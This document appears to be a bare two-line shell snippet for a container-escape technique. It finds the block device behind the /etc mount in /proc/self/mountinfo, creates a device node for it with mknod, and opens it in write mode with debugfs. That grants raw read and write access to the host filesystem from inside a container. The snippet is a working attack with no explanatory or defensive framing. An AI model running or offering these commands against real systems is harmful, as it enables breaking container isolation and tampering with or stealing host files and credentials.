mknod debugfs_priv b `cat /proc/self/mountinfo |grep etc/|head -1|awk '{print $3}'|cut -d : -f 1` `cat /proc/self/mountinfo |grep etc/|head -1|awk '{print $3}'|cut -d : -f 2`
debugfs -w debugfs_priv &
